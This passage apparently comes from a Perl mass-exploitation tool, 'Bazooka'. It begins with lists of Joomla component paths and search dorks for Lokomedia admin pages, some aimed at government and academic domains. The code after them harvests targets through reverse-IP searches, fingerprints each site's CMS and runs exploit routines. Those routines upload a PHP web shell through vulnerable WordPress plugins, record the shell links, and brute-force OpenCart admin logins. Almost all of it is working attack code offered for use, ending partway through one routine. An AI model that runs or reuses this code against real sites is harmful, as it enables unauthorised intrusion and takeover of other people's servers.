index.php?option=com_joomdocs
index.php?option=com_joomgalleryfunc
index.php?option=com_joomlaconnect_be
index.php?option=com_joomlaflashfun
index.php?option=com_joomlaflickr
index.php?option=com_joomlaupdater
index.php?option=com_joomla-visites
index.php?option=com_joommail
index.php?option=com_joomnik
index.php?option=com_joomportfolio
index.php?option=com_joomtouch
index.php?option=com_jp_jobs
index.php?option=com_jphone
index.php?option=com_jpodium
index.php?option=com_j-projects
index.php?option=com_jquarks4s
index.php?option=com_jreactions
index.php?option=com_jreservation
index.php?option=com_jscalendar
index.php?option=com_jshop
index.php?option=com_jstore
index.php?option=com_jsubscription
index.php?option=com_jsupport
index.php?option=com_jtickets
index.php?option=com_jtm
index.php?option=com_jukebox
index.php?option=com_juliaportfolio
index.php?option=com_jwhmcs
index.php?option=com_k2
index.php?option=com_king
index.php?option=com_kk
index.php?option=com_konsultasi
index.php?option=com_ksadvertiser
index.php?option=com_kunena
index.php?option=com_lead
index.php?option=com_leader
index.php?option=com_libros
index.php?option=com_listbingo
index.php?option=com_listing
index.php?option=com_lovefactory
index.php?option=com_lyftenbloggie
index.php?option=com_maianmedia
index.php?option=com_manager
index.php?option=com_market
index.php?option=com_magazine
index.php?option=com_marketplace
index.php?option=com_markt
index.php?option=com_matamko
index.php?option=com_mdigg
index.php?option=com_media_library
index.php?option=com_mediamall
index.php?option=com_mediqna
index.php?option=com_memory
index.php?option=com_menu
index.php?option=com_mochigames
index.php?option=com_mosres
index.php?option=com_mtfireeagle
index.php?option=com_mtree
index.php?option=com_multimap
index.php?option=com_multiroot
index.php?option=com_mamml
index.php?option=com_mycar
index.php?option=com_mycontent
index.php?option=com_myfiles
index.php?option=com_myhome
index.php?option=com_mysms
index.php?option=com_na_content
index.php?option=com_na_newsdescription
index.php?option=com_nicetalk
index.php?option=com_network
index.php?option=com_newsletter
index.php?option=com_fq
index.php?option=com_newsfeeds
index.php?option=com_nfnaddressbook
index.php?option=com_ninjamonials
index.php?option=com_noticeboard
index.php?option=com_noticias
index.php?option=com_obsuggest
index.php?option=com_oprykningspoint_mc
index.php?option=com_ops
index.php?option=com_otzivi
index.php?option=com_oziogallery2
index.php?option=com_packages
index.php?option=com_pandafminigames
index.php?option=com_pandarminigames
index.php?option=com_pbbooking
index.php?option=com_pc
index.php?option=com_securityimages
index.php?option=com_artlinks
index.php?option=com_people
index.php?option=com_perchagallery
index.php?option=com_galleria
index.php?option=com_phocadocumentation
index.php?option=com_phocagallery
index.php?option=com_photobattle
index.php?option=com_photomapgallery
index.php?option=com_php
index.php?option=com_picsell
index.php?option=com_portfol
index.php?option=com_portfolio
index.php?option=com_powermail
index.php?option=com_press
index.php?option=com_prime
index.php?option=com_pro_desk
index.php?option=com_properiesaid
index.php?option=com_propertylab
index.php?option=com_question
index.php?option=com_quickfaq
index.php?option=com_radio
index.php?option=com_record
index.php?option=com_restaurant
index.php?option=com_restaurantmenumanager
index.php?option=com_rokmodule
index.php?option=com_rsappt_pro
index.php?option=com_rsappt_pro2
index.php?option=com_rscomments
index.php?option=com_rsform
index.php?option=com_rsgallery2
index.php?option=com_rssreader
index.php?option=com_s2clanroster
index.php?option=com_sar_news
index.php?option=com_science
index.php?option=com_searchlog
index.php?option=com_sebercart
index.php?option=com_serie
index.php?option=com_sermonspeaker
index.php?option=com_seyret
index.php?option=com_simplefaq
index.php?option=com_simpleshop
index.php?option=com_smartsite
index.php?option=com_socialads
index.php?option=com_software
index.php?option=com_solution
index.php?option=com_soundset
index.php?option=com_serverstat
index.php?option=com_spa
index.php?option=com_spartsite
index.php?option=com_spec
index.php?option=com_spielothek
index.php?option=com_sportfusion
index.php?option=com_spsnewsletter
index.php?option=com_sqlreport
index.php?option=com_start
index.php?option=com_staticxt
index.php?option=com_surveymanager
index.php?option=com_svmap
index.php?option=com_sweetykeeper
index.php?option=com_tariff
index.php?option=com_teacher
index.php?option=com_team
index.php?option=com_teams
index.php?option=com_techfolio
index.php?option=com_television
index.php?option=com_tender
index.php?option=com_timereturns
index.php?option=com_timetrack
index.php?option=com_topmenu
index.php?option=com_tour
index.php?option=com_tpjobs
index.php?option=com_trabalhe_conosco
index.php?option=com_trading
index.php?option=com_travelbook
index.php?option=com_ttvideo
index.php?option=com_tupinambis
index.php?option=com_ultimateportfolio
index.php?option=com_units
index.php?option=com_universal
index.php?option=com_users
index.php?option=com_vat
index.php?option=com_vehiclemanager
index.php?option=com_vid
index.php?option=com_vikrealestate
index.php?option=com_vjdeo
index.php?option=com_vxdate
index.php?option=com_wallpapers
index.php?option=com_weblinks
index.php?option=com_webtv
index.php?option=com_wgpicasa
index.php?option=com_wmi
index.php?option=com_wmptic
index.php?option=com_wmtpic
index.php?option=com_wrapper
index.php?option=com_xcloner-backupandrestore
index.php?option=com_xevidmegahd
index.php?option=com_xgallery
index.php?option=com_xmovie
index.php?option=com_yanc
index.php?option=com_yvhotels
index.php?option=com_zimbcomment
index.php?option=com_zimbcore
index.php?option=com_zina
index.php?option=com_zoom
index.php?option=com_zoomprotfolio
index.php?option=com_fm
index.php?option=phocaguestbook
index.php?option=mailto
index.php?option=con_extplorer
index.php?option=com_worldrates
index.php?option=com_glossary
index.php?option=com_musepoes
index.php?option=com_buslicense
index.php?option=com_recipes
index.php?option=com_jokes
index.php?option=com_estateagent
index.php?option=com_catalogshop
index.php?option=com_akogallery
index.php?option=com_garyscookbook
index.php?option=com_flyspray
index.php?option=com_hashcash
index.php?option=com_mambads
index.php?option=com_hotproperty
index.php?option=com_directory
index.php?option=com_awesom
index.php?option=com_shambo2
index.php?option=com_downloads
index.php?option=com_peoplebook
index.php?option=com_guest
index.php?option=com_quote
index.php?option=com_gallery
index.php?option=com_neogallery
index.php?option=com_comments
index.php?option=com_rapidrecipe
index.php?option=com_board
index.php?option=com_xfaq
index.php?option=com_paxxgallery
index.php?option=com_quiz
index.php?option=com_ricette
index.php?option=com_jooget
index.php?option=com_jotloader
index.php?option=com_jradio
index.php?option=com_jquarks
index.php?option=com_sponsorwall
index.php?option=com_registration
index.php?option=com_zoomportfolio
index.php?option=com_dirfrm
index.php?option=com_jgrid
index.php?option=com_ongallery
index.php?option=com_neorecruit
index.php?option=com_joomla
index.php?option=com_youtube
index.php?option=com_sar
index.php?option=com_jsjobs
index.php?option=com_beeheard
index.php?option=com_activehelper
index.php?option=com_camp
index.php?option=com_awdwall
index.php?option=com_joltcard
index.php?option=com_if
index.php?option=com_gadgetfactory
index.php?option=com_qpersonel
index.php?option=com_mv
index.php?option=com_weberpcustomer
index.php?option=com_articles
index.php?option=com_webeecomment
index.php?option=com_xobbix
index.php?option=com_loginbox
index.php?option=com_shoutbox
index.php?option=com_dwgraphs
index.php?option=com_xmap
index.php?option=com_business
index.php?option=com_departments
index.php?option=com_smestorage
index.php?option=com_aml
index.php?option=com_flash
index.php?option=com_jwmmxtd
index.php?option=com_giftexchange
index.php?option=com_jeformcr
index.php?option=com_org
index.php?option=com_about
index.php?option=com_color
index.php?option=com_party
index.php?option=com_liveticker
index.php?option=com_joomlaconnect
index.php?option=com_communitypolls
index.php?option=com_videos
index.php?option=com_productbook
index.php?option=com_photoblog
index.php?option=com_jequizmanagement
index.php?option=com_biographies
index.php?option=com_gurujibook
index.php?option=com_gameserver
index.php?option=com_jvideodirect
index.php?option=com_rd
index.php?option=com_artistavenue
index.php?option=com_airmonoblock
index.php?option=com_dhforum
index.php?option=com_trabalhe
index.php?option=com_oprykningspoint
index.php?option=com_adagency
index.php?option=com_morfeoshow
index.php?option=com_mediaslide
index.php?option=com_jcalpro
index.php?option=com_zcalendar
index.php?option=com_acmisc
index.php?option=com_virtuemart
index.php?option=com_docman
index.php?option=com_joomgallery
index.php?option=com_mojo
index.php?option=com_joaktree
index.php?option=com_mygallery
index.php?option=Com_Joomclip
index.php?option=com_mytube
index.php?option=com_jbudgetsmagic
index.php?option=com_rsmonials
index.php?option=com_cmimarketplace
index.php?option=com_mailto
index.php?option=com_maianmusic
index.php?option=com_pcchess
index.php?option=com_prod
index.php?option=com_waticketsystem
index.php?option=com_news
index.php?option=com_pccookbook
index.php?option=com_fantasytournament
index.php?option=com_camelcitydb
index.php?option=com_paxgallery
index.php?option=com_ice
index.php?option=com_livechat
index.php?option=com_feederator
index.php?option=com_competitions
index.php?option=com_clickheat
index.php?option=com_dailymessage
index.php?option=com_ignitegallery
index.php?option=com_joomtracker
index.php?option=com_hotspots
index.php?option=com_is
index.php?option=com_gameq
index.php?option=com_prayercenter
index.php?option=com_webhosting
index.php?option=com_alphacontent
index.php?option=com_filiale
index.php?option=com_extplorer
index.php?option=com_actualite
index.php?option=com_d
index.php?option=com_astatspro
index.php?option=com_search
index.php?option=com_expose
index.php?option=com_philaform
index.php?option=com_mosmedia
index.php?option=com_thopper
index.php?option=com_resman
index.php?option=com_poll
index.php?option=com_kochsuite
index.php?option=com_linkdirectory
index.php?option=com_lmo
index.php?option=com_rss
index.php?option=com_oziogallery
index.php?option=com_noticia
index.php?option=com_kkcontent
index.php?option=com_jphoto
index.php?option=com_quicknews
index.php?option=com_musicgallery
index.php?option=com_pinboard
index.php?option=com_amocourse
index.php?option=com_jfusion
index.php?option=com_misterestate
index.php?option=com_tpdugg
index.php?option=com_alphauserpoints
index.php?option=com_foobla
index.php?option=com_jlord
index.php?option=com_facebook
index.php?option=com_groupjive
index.php?option=com_jd
index.php?option=com_recerca
index.php?option=com_icrmbasic
index.php?option=com_album
index.php?option=com_lucygames
index.php?option=com_siirler
index.php?option=com_idoblog
index.php?option=com_pms
index.php?option=com_jobline
index.php?option=com_K
index.php?option=com_jumi
index.php?option=com_ijoomla
index.php?option=com_media
index.php?option=com_omphotogallery
index.php?option=com_seminar
index.php?option=com_jvideo
index.php?option=com_agoragroup
index.php?option=Com_Agora
index.php?option=com_rsgallery
index.php?option=com_bsadv
index.php?option=com_djiceshoutbox
index.php?option=com_rdautos
index.php?option=com_na
index.php?option=com_simple
index.php?option=com_allhotels
index.php?option=com_volunteer
index.php?option=com_tech
index.php?option=com_mydyngallery
index.php?option=com_jmovies
index.php?option=com_thyme
index.php?option=com_catalogproduction
index.php?option=com_contactinfo
index.php?option=com_jb
index.php?option=com_dadamail
index.php?option=com_ongumatimesheet
index.php?option=com_googlebase
index.php?option=com_treeg
index.php?option=com_ab
index.php?option=com_kbase
index.php?option=com_ionfiles
index.php?option=com_ds
index.php?option=com_mad
index.php?option=com_imagebrowser
index.php?option=com_user
index.php?option=com_ezstore
index.php?option=com_products
index.php?option=com_propertiesaid
index.php?option=com_qcontacts
index.php?option=com_quran
index.php?option=com_races
index.php?option=com_ranking
index.php?option=com_rd_download
index.php?option=com_realestatemanager
index.php?option=com_realtyna
index.php?option=com_redshop
index.php?option=com_remository
index.php?option=com_restaurantguide
index.php?option=com_rokdownloads
index.php?option=com_route
index.php?option=com_rwcards
index.php?option=com_s5clanroster
index.php?option=com_sbsfile
index.php?option=com_school
index.php?option=com_schools
index.php?option=com_dtregister
index.php?option=com_n
index.php?option=com_altas
index.php?option=com_vr
index.php?option=com_brightweblinks
index.php?option=com_versioning
index.php?option=com_xewebtv
index.php?option=com_jabode
index.php?option=com_netinvoice
index.php?option=com_expshop
index.php?option=com_yvcomment
index.php?option=com_joomladate
index.php?option=com_joomradio
index.php?option=com_eQuotes
index.php?option=com_acctexp
index.php?option=com_joobb
index.php?option=com_artist
index.php?option=com_xsstream
index.php?option=com_comprofiler
index.php?option=com_jpad
index.php?option=com_joomlaxplorer
index.php?option=com_onlineflashquiz
index.php?option=com_rekry
index.php?option=com_custompages
index.php?option=com_galeria
index.php?option=com_mcquiz
index.php?option=com_ynews
index.php?option=com_neoreferences
index.php?option=com_candle
index.php?option=com_joovideo
index.php?option=com_alberghi
index.php?option=com_restaurante
index.php?option=com_puarcade
index.php?option=com_jjgallery
index.php?option=com_jcs
index.php?option=com_mp
index.php?option=com_wmtportfolio
index.php?option=com_wmtgallery
index.php?option=com_panoramic
index.php?option=com_slideshow
index.php?option=com_joom
index.php?option=com_joomlaradiov
index.php?option=com_jombib
index.php?option=com_rsfiles
index.php?option=com_eventlist
index.php?option=com_gmaps
index.php?option=com_ponygallery
index.php?option=com_autostand
index.php?option=com_swmenufree
index.php?option=com_joomlaboard
index.php?option=com_webring
index.php?option=com_reporter
index.php?option=com_jeux
index.php?option=com_nfn
index.php?option=com_bayesiannaivefilter
index.php?option=com_doc
index.php?option=com_clasifier
index.php?option=com_hwdvideoshare
index.php?option=com_acajoom
index.php?option=com_facileforms
index.php?option=com_books
index.php?option=com_tophotelmodule
index.php?option=com_lowcosthotels
index.php?option=com_newsflash
index.php?option=com_gigcal
index.php?option=com_flashmagazinedeluxe
index.php?option=com_bookjoomlas
index.php?option=com_juser
index.php?option=com_moofaq
index.php?option=com_portafolio
index.php?option=com_projectfork
index.php?option=com_tickets
index.php?option=com_joomloads
index.php?option=com_ninjamonial
index.php?option=com_jtips
index.php?option=com_artportal
index.php?option=com_joomlub
index.php?option=com_joomloc
index.php?option=com_djcatalog
index.php?option=com_foobla_suggestions
index.php?option=com_reservations
index.php?option=com_chronoconnectivity
index.php?option=com_djartgallery
index.php?option=com_jmarket
index.php?option=com_jcommunity
index.php?option=com_cinema
index.php?option=com_answers
index.php?option=com_galleryxml
index.php?option=com_frontpage
index.php?option=com_google_maps
index.php?option=com_image
index.php?option=com_photos
index.php?option=com_picasa2gallery
index.php?option=com_ybggal
index.php?option=com_jcafe
index.php?option=com_jejob
index.php?option=com_sef
index.php?option=jesubmit
index.php?option=com_projectlog
index.php?option=com_reportcard
index.php?option=com_artforms
index.php?option=com_jomholiday
index.php?option=com_ownbiblio
index.php?option=com_tag
index.php?option=com_commedia
index.php?option=com_conference
index.php?option=com_realty
index.php?option=com_sobi2
index.php?option=com_jomdirectory
index.php?option=com_bnf
index.php?option=com_sport
index.php?option=com_personal
index.php?option=com_play
index.php?option=com_etree
index.php?option=com_file
index.php?option=com_bca-rss-syndicator
index.php?option=com_ckforms
index.php?option=com_datafeeds
index.php?option=com_fabrik
index.php?option=com_ganalytics
index.php?option=com_gcalendar
index.php?option=com_hsconfig
index.php?option=com_if_surfalert
index.php?option=com_janews
index.php?option=com_jfeedback
index.php?option=com_joomlapicasa2
index.php?option=com_jshopping
index.php?option=com_jvehicles
index.php?option=com_linkr
index.php?option=com_mmsblog
index.php?option=com_mscomment
index.php?option=com_ninjarsssyndicator
index.php?option=com_onlineexam
index.php?option=com_orgchart
index.php?option=com_properties
index.php?option=com_rpx
index.php?option=com_sectionex
index.php?option=com_simpledownload
index.php?option=com_userstatus
index.php?option=com_aquiz
index.php?option=com_as
index.php?option=com_as_shop
index.php?option=com_msg
index.php?option=com_club
modules/mod_simplefileuploadv1.3
          Lokomedia Dorks
nurl:statis-1-profil.html
inurl:statis-2-profil.html
inurl:statis-3-strukturorganisasi.html
intext:lokomedia inurl:statis- ext:html
intext:lokomedia inurl:kategori- 6 - .html
intext:lokomedia inurl:semua- ext:html
inurl:kategori-32-daerah.html site:.com
intext:copyright by  inurl:statis-1 ext:html
intext:lokomedia inurl:statis- ext:html
intext:lokomedia inurl:semua- ext:html
intext:lokomedia inurl:hubungi- ext:html
intext:lokomedia inurl:kategori- ext:html
intext:lokomedia inurl:berita- ext:html
inurl:foto_info
inurl:foto_produk intext:shop
inurl:foto_banner intext:shop
inurl:foto_berita intext:shop
inurl:foto_user intext:shop
inurl:/adminweb/login 
inurl:content.php?module=banner
inurl:content.php?module=user
inurl:content.php?module=berita
inurl:content.php?module=iklan
inurl:content.php?module=produk
intext:copyright @ inurl:/berita- - ext:html site:.
intext:Kembali ke Website Utama
intext:Developed by  inurl:berita- ext:html
inurl:/statis-1- ext:html site:.
inurl:/statis-10 ext:html
inurl:/statis-16 ext:html
intext:copyright @ inurl:/berita- - ext:html site:.
intext:Kembali ke Website Utama
intext:Developed by  inurl:berita- ext:html
intext:copyright by  inurl:statis-1 ext:html
inurl:/semua-berita.html site:coli :V 
intext:copyright @ inurl:/berita- - ext:html site:.
intext:Kembali ke Website Utama
intext:Developed by  inurl:berita- ext:html
inurl:/statis-1- ext:html site:.
inurl:/statis-1- ext:html site:.com/net/id/coli :V
Copyright © 2013 by Polostama. All rights reserved.
inurl:media.php?module=home

 DORK ADMIN PAGE LOGIN :

intext:Developed by  inurl:berita- ext:html
intitle:.:: Administrator -  Website ::. intext:LOGIN ADMINISTRATOR 
intittle:adminstration login lokomedia site:go.id
intitle:.:: Administrator -  Website ::. intext:LOGIN ADMINISTRATOR site:.ac.id
intittle:adminstration login lokomedia site:go.id
intitle:.:: Administrator -  Website ::. intext:LOGIN ADMINISTRATOR site:.ac.id
intittle:Administrator CMS Lokomedia
intittle:..::: Login Anggota :::..
intitle:.:: HALAMAN ADMINISTRATOR ::.
intittle:..::: Login Elearning :::..
intittle:..::: Login Administrator :::.. site:go.id
intittle:.:: Login Adminstration ::. site:go.id
intittle:..::: Login Sistem ::.. site:go.id
intittle:.:: ADMINISTRATOR LOGIN ::. site:go.id
intittle:adminstration > login site:go.id
intittle:adminstration > Website site:go.id
intitle:Panel Administrator
inur:.com/adminweb 
inur:.org/adminweb 
inur:.net/adminweb 
inur:.go.id/adminweb 
inur:.desa.id/adminweb 
inur:.co.id/adminweb 
inur:.web.id/adminweb 
inur:/adminweb 

put all this in file txt === > Dorks.txt then run script again and choose 1
");
open(save, '>>Dorks.txt');
    print save "$link\n";
    close(save);
}
if($targett eq '5')
{
print "         [Tools Coded by Fallag Gassrini | Priv8 4 Tunisian Fallaga Team 2016-2017 ]\n       Use it and Fuck u If  You change rights coz changing my Fucking name by Yours\n                             Wont make you da Real Coder \n              Hackers make tools but tools Wont make you a fucking Hacker \n[ Fuck Zionist , Fuck usa , Fuck ISIS , Free Palestine Love for Palestine Life For Palestine <3 ]\n";
}
else{
print color("red"), "OPEN UR FUCKING EYES -_-\n";
print color('reset');
}
##############################
##############################
sub gett(){
$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
for ($i = 1; $i <= 255; $i+=1){
$ips ="$a.$b.$c.$i";
OUTER: foreach $ip($ips){
print color("red"), " [IP] > [$ips]\n";
print color ('reset');
        open (TEXT, '>>ipsbazouka.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();

}
minibot();
open HANDLE,">","tobazooka.txt";
print HANDLE "";
close HANDLE;


}
}
#############################
sub get(){

$ip= (gethostbyname($tofuck))[4];
my ($a,$b,$c,$d) = unpack('C4',$ip);
$ips="$a.$b.$c.$d";
print " [IP] > [$ips]\n";
        open (TEXT, '>>ipsbazouka.txt');
        print TEXT "$ips\n";
        close (TEXT);
$dork="ip:$ips";
gassone();
minibot();


}
####################################"
sub gassone(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(save, '>>urlbazouka.txt');
    print save "$link\n";
    close(save);

print "$link\n";
open(savea, '>>tobazooka.txt');
    print savea "$link\n";
    close(savea);
	

						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
next OUTER;

open HANDLE,">","tobazooka.txt";
print HANDLE "";
close HANDLE;}
}
}
###########
sub gassonee(){
for ($ii = 1; $ii <= 2000; $ii+=10){

$url = "http://www.bing.com/search?q=$dork&filt=all&first=$ii&FORM=PERE";
$resp = $ag->request(HTTP::Request->new(GET => $url));
$rrs = $resp->content;

while($rrs =~ m/<a href=\"?http:\/\/(.*?)\//g){



$link = $1;
	if ( $link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|yahoo|microsof/)
	{
				if ($link !~ /^http:/)
			 {
				$link = 'http://' . "$link" . '/';
			 }



if($link !~ /\"|\?|\=|index\.php/){
					if  (!  grep (/$link/,@result))

{print "$link\n";
open(save, '>>urlbazouka.txt');
    print save "$link\n";
    close(save);
						push(@result,$link);
					}
} 
}
}
####
if ($rrs !~ m/class=\"sb_pagN\"/g){
exit;
}
}
}
}
sub minibot(){
open(tarrget,"tobazooka.txt") ;
while(<tarrget>){
chomp($_);
$site = $_;
filter();
open HANDLE,">","tobazooka.txt";
print HANDLE "";
close HANDLE;

}
}

sub bot(){ 
$logos="
d8888b.  .d8b.  d88888D  .d88b.   .d88b.  db   dD  .d8b.  
88  `8D d8' `8b YP  d8' .8P  Y8. .8P  Y8. 88 ,8P' d8' `8b 
88oooY' 88ooo88    d8'  88    88 88    88 88,8P   88ooo88 
88~~~b. 88~~~88   d8'   88    88 88    88 88`8b   88~~~88 
88   8D 88   88  d8' db `8b  d8' `8b  d8' 88 `88. 88   88 
Y8888P' YP   YP d88888P  `Y88P'   `Y88P'  YP   YD YP   YP 
 
";
print color('bold red'), $logos;
print "Welcome To Hell Enter List : \n";
$list=<STDIN>;
open(tarrget,"<$list") or die "add list \n";
while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site/"; };
filter();
}
sub filter($site){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
$ua->timeout (15);
$magsite = $site . '/admin';
my $magcms = $ua->get("$magsite")->content;
my $spyxy = $ua->get("$site")->content;
if($spyxy =~/wp-content\/themes\/|wp-content\/plugins\/|wordpress/) {
print "[+] $site";	
   print color("bold green"), " - WordPress\n\n";     print color('reset');
open(save, '>>tmp/wordpress.txt');
    print save "$site\n";
	    close(save);
showbiz();
			#virulaoption();
	wpinjetc();
    revshellv1();
    gravity();
    upindex();
	getconfig();
    jombmang();
	formcraft();
	wysija();
	addblockblocker();
    blaze();
	catpro();
    cherry();
	downloadsmanager();
    formcraft();
    powerzoomer();
	ads();
    slideshowpro();
    wpmobiledetector();
	inboundiomarketing();
    dzszoomsounds();
    reflexgallery();
    sexycontactform();
    wtffu();
    phpeventcalendar();
    synoptic();
    Wpshop();
	revslider();
	com_1();
    com_2();
    com_3();
    com_4();
    com_5();
    com_6();
    com_7();
    com_8();
    com_9();
    com_10();
    com_11();
    com_12();
    com_13();
    com_14();
    com_15();
    com_16();
    com_17();
    com_18();
    com_19();
    com_20();
    com_21();
    com_22();
    com_23();
    com_24();
    com_25();
    com_26();
    com_27();
    com_28();
    com_29();
    com_30();
    com_31();
    com_32();
    com_33();
    com_34();
    com_35();
    com_36();
    com_37();
    com_38();
    com_39();
    com_40();
    com_41();
    com_42();
    com_43();
	
}

elsif($spyxy =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
print "[+] $site";	
   print color("bold green"), " - Joomla\n\n";         print color('reset');

open(save, '>>tmp/joomla.txt');
    print save "$site\n";
    close(save);
	jceshell();
    comjce();
	comedia();
    comediaindex();
    comjdowloads();
    comfabr();
    indecomfabr();
    mods();
    comadsmanegr();
    comblog();
    comusers();
    foxcontact();
	comweblinks();
	mod_simplefileupload();
    }
elsif($spyxy =~/\/modules\/system\/system.menus.css|\/sites\/default\/files\/|<meta name=\"Generator\" content=\"Drupal 7/) {
print "[+] $site";	
   print color("bold green"), " - Drupal\n\n";     print color('reset');
open(save, '>>tmp/Drupal.txt');
    print save "$site\n";
    close(save);
     fuckdrupal();
}
elsif($spyxy =~/Prestashop|prestashop/) {
    print color('bold white'),"\n[+] $site - ";
    print color("bold green"), "Prestashop\n\n";
    print color('reset');
    open(save, '>>tmp/Prestashop.txt');
    print save "$site\n";   
    close(save);
columnadverts();
soopamobile();
soopabanners();
vtermslideshow();
simpleslideshow();
productpageadverts();
homepageadvertise();
homepageadvertise2();
jro_homepageadvertise();
attributewizardpro();
oneattributewizardpro();
attributewizardproOLD();
attributewizardpro_x();
advancedslider();
cartabandonmentpro();
cartabandonmentproOld();
videostab();
wg24themeadministration();
fieldvmegamenu();
wdoptionpanel();
pk_flexmenu();
pk_vertflexmenu();
nvn_export_orders();
megamenu();
tdpsthemeoptionpanel();
psmodthemeoptionpanel();
masseditproduct();
    }
elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
print "[+] $site";	
   print color("bold green"), " - Magento\n\n";     print color('reset');

open(save, '>>tmp/Magento.txt');
magento();
    print save "$site\n";
    close(save);
    }
	elsif($spyxy =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
	print "[+] $site";	
   print color("bold white"), " - OpenCart\n\n";     print color('reset');

open(save, '>>tmp/vbulletin.txt');
    print save "$site\n";
    close(save);
    }elsif($efreez =~/<meta name="description" content="vBulletin Forums" \/>|<meta name="generator" content="vBulletin" \/>|vBulletin.version =|"baseurl_core":/) {
print "[+] $site";	
   print color("bold green"), " - vBulletin\n\n";     print color('reset');

open(save, '>>tmp/vbulletin.txt');
    print save "$site\n";
    close(save);
    }
	elsif($spyxy =~/image\/gif/) {
print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "Lokomedia\n\n";
    print color('reset');
    open(save, '>>tmp/lokomedia.txt');
    print save "$site\n";   
    close(save);
    lokomedia();
}
elsif($spyxy =~/lokomedia/) {
print color('bold white'),"\n[$a] $site - ";
    print color("bold green"), "Lokomedia\n\n";
    print color('reset');
    open(save, '>>tmp/lokomedia.txt');
    print save "$site\n";   
    close(save);
    lokomedia();
}
    else{
	print "[-] $site";	
print  color("bold red"), " - Unknown\n\n";     print color('reset');
    open(save, '>>tmp/Unknown.txt');
    print save "$site\n";   
    close(save);

}
}



###### OpenCart #######
sub opencart{
print"[-] Starting brute force";
open(a,"<$pass") or die "$!";
while(<a>){
chomp($_);
$ocuser = admin;
$ocpass = $_;
print "\n[-] Trying: $ocpass ";
$OpenCart= $site . '/admin/index.php';

$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
$response = $ua->request($ocbrute);
$stat = $response->status_line;
if ($stat =~ /302/){
print "- ";
print color('bold green'),"FOUND\n";
print color('reset');
open (TEXT, '>>Result.txt');
print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
close (TEXT);
next OUTER;
}
}
}

################ Adblock Blocker #####################
sub addblockblocker(){

my $addblockurl = "$site/wp-admin/admin-ajax.php?action=getcountryuser&cs=2";
my $response = $ua->post($addblockurl, Content_Type => 'multipart/form-data', Content => [popimg => ["XBazooka.php"],]);
$addblockup="$site/wp-content/uploads/$year/$month/XBazooka.php?X=Bazooka";
my $checkaddblock = $ua->get("$addblockup")->content;

if($checkaddblock =~/X Bazooka/) {
print color('bold white'),"[Adblock Blocker]";
print color('bold white')," .................... ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $addblockup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$addblockup\n";
close (TEXT);
}else{
print color('bold white'),"[Adblock Blocker]";
print color('bold white')," .................... ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";}
}
################ Blaze #####################
sub blaze(){
my $url = "$site/wp-admin/admin.php?page=blaze_manage";
my $blazeres = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XBazooka.php"], task => 'blaze_add_new_album', album_name => '', album_desc => '',]);

if ($blazeres->content =~ /\/uploads\/blaze\/(.*?)\/big\/XBazooka.php/) {
$uploadfolder=$1;
$blazeup="$site/wp-content/uploads/blaze/$uploadfolder/big/XBazooka.php?X=Bazooka";
print color('bold white'),"[Blaze]";
print color('bold white')," .............................. ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $blazeup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$blazeup\n";
close (TEXT);
}else{
print color('bold white'),"[Blaze]";
print color('bold white')," .............................. ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}
################ Catpro #####################
sub catpro(){

my $url = "$site/wp-admin/admin.php?page=catpro_manage";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [album_img => ["XBazooka.php"], task => 'cpr_add_new_album', album_name => '', album_desc => '',]);

if ($response->content =~ /\/uploads\/catpro\/(.*?)\/big\/XBazooka.php/) {
$uploadfolder=$1;
$catproup="$site/wp-content/uploads/catpro/$uploadfolder/big/XBazooka.php?X=Bazooka";
print color('bold white'),"[Catpro]";
print color('bold white')," ............................. ";
print color('bold white'),"";
print color('bold green'),"VULN";
print color('bold white'),"\n";
print color('bold green')," [";
print color('bold red'),"+";
print color('bold green'),"] ";
print color('bold white'),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $catproup\n";
open (TEXT, '>>Result/Shell3z.txt');
print TEXT "$catproup\n";
close (TEXT);
}else{
print color('bold white'),"[Catpro]";
print color('bold white')," ............................. ";
print color('bold red'),"[Failed]";
print color('bold white'),"\n";
}
}
################ Cherry Plugin #####################
sub cherry(){

my $url = "$site/wp-content/plugins/cherry-plugin/admin/import-export/upload.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [file => ["XBazooka.php"],]);

